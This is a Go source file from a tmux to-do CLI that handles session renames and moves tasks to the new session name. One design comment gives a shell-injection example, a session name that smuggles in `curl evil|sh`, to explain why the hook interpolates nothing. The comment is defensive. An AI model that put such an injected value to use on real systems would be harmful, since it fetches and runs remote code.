package cli

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"

	"github.com/agusarias/tmux-todo/internal/scope"
	"github.com/agusarias/tmux-todo/internal/store"
)

// recordSession refreshes the session_id -> name map for the session tdo is
// running in. Every command that resolves a scope calls it, which is what keeps
// the map fresh enough for the session-renamed hook to recover the old name.
//
// A failure is logged and swallowed on purpose. The map exists to make a *later*
// rename recoverable; losing that is strictly better than refusing to open the
// popup, and this is the popup's hot path. Nothing upstream is told, so no exit
// code changes and no command output moves. The failure is provoked for real in
// TestSessionMapFailureDoesNotFailTheCommand rather than through a stub, so the
// test covers the wiring and not only this function.
func recordSession(ctx context.Context, db *store.DB, rs scope.Resolved) {
	if rs.Session == nil || rs.SessionID == "" {
		return
	}
	if err := db.RecordSession(ctx, rs.SessionID, rs.Session.Key); err != nil {
		log.Printf("tdo: record session name: %v", err)
	}
}

// runSessionRenamed moves a session's tasks from whatever name they were filed
// under to the name it has now. It is what the tmux session-renamed hook calls.
//
// It works in two forms, and the difference is only where the new name comes
// from:
//
//	tdo session-renamed             the session this process is in ($TMUX)
//	tdo session-renamed -- "<name>" that named session
//
// **The hook uses the first form**, and that is a security property, not a
// convenience. tmux cannot hand the *id* to a hook — #{session_id} expands to
// "$0", run-shell passes its argument to sh, and sh expands $0 to its own name —
// so the obvious hook interpolates the *name* into the shell string instead. A
// name is user data: with sh single quotes, a session called `x'; curl evil|sh; '`
// executes. There is no tmux format that escapes for sh (#{q:} escapes for tmux's
// own parser), so the fix is to interpolate nothing. run-shell's child inherits
// $TMUX, whose third field is the session the hook fired for, so plain
// `tdo session-renamed` already knows which session it is talking about —
// verified on tmux 3.7b. It also sidesteps the two limits of the targeted form:
// a name containing ":" cannot be used as a tmux target at all.
//
// The named form stays because it is the testable, scriptable one, and because
// "reconcile this session" and "reconcile that session" are genuinely different
// jobs.
//
// Every path a working tmux can reach is a *silent* success. The hook fires on
// every rename in the user's tmux, and run-shell surfaces any output the command
// produces, so a chatty no-op here would flash a window on each rename. --verbose
// is for proving the behaviour by hand.
func runSessionRenamed(args []string, stdout, stderr io.Writer) int {
	fs := flag.NewFlagSet("session-renamed", flag.ContinueOnError)
	fs.SetOutput(stderr)
	dbPath := fs.String("db", "", "database path (default: XDG data dir)")
	verbose := fs.Bool("verbose", false, "report what moved (silent by default: the hook's output would pop up a tmux window)")
	// parseArgs, so a session named "-x" can be passed after an explicit "--"
	// the way the documented hook command does.
	if err := parseArgs(fs, args); err != nil {
		return 2
	}
	if fs.NArg() > 1 {
		return fail(stderr, usagef("session-renamed takes at most one session name, got %d", fs.NArg()))
	}

	report := func(format string, a ...any) int {
		if *verbose {
			fmt.Fprintf(stdout, format+"\n", a...)
		}
		return 0
	}

	// Deliberately not openEnv: that resolves the current context and refreshes
	// the map as a side effect, and the current context *is* the renamed session
	// when the hook fires — so it would record id -> newName before this command
	// reads the old name, turning the rename into a silent no-op. It also saves a
	// subprocess, since the targeted SessionID query below is the only tmux call
	// this path needs.
	db, closeDB, err := openStore(*dbPath)
	if err != nil {
		return fail(stderr, err)
	}
	defer closeDB()

	newName, id, err := renamedSession(newResolver(), fs.Args())
	if err != nil {
		return fail(stderr, err)
	}

	ctx := context.Background()
	oldName, err := db.SessionName(ctx, id)
	switch {
	case errors.Is(err, store.ErrNoSession):
		// tdo has never run in this session, so it owns no tasks under any name.
		// Nothing to move, and nothing to complain about.
		return report("session %s is not in the map: nothing to move", id)
	case err != nil:
		return fail(stderr, err)
	}
	if oldName == newName {
		// Already current — a second hook firing, or another tdo invocation got
		// here first.
		return report("session %s already maps to %q: nothing to move", id, newName)
	}

	moved, err := db.RenameSession(ctx, oldName, newName)
	if err != nil {
		return fail(stderr, err)
	}
	// The map is refreshed even when nothing moved: the name is what a *future*
	// rename will need, and leaving it stale would make the next rename rewrite
	// from a name that no longer exists.
	if err := db.RecordSession(ctx, id, newName); err != nil {
		return fail(stderr, err)
	}
	return report("moved %d task(s) from %q to %q (session %s)", moved, oldName, newName, id)
}

// renamedSession works out which session to reconcile and what it is now called.
// With a name it asks tmux for that session's id; without one it reads both from
// the tmux environment, which is the session the hook fired for. Either way it
// costs one subprocess.
func renamedSession(r scope.Resolver, args []string) (name, id string, err error) {
	if len(args) == 1 {
		name = args[0]
		id, err = r.SessionID(name)
		return name, id, err
	}
	resolved, err := r.Resolve()
	if err != nil {
		return "", "", err
	}
	if resolved.Session == nil {
		return "", "", fmt.Errorf("session-renamed: %w (not inside tmux, and no session name given)", scope.ErrUnavailable)
	}
	if resolved.SessionID == "" {
		return "", "", errors.New("session-renamed: tmux reported no session id")
	}
	return resolved.Session.Key, resolved.SessionID, nil
}
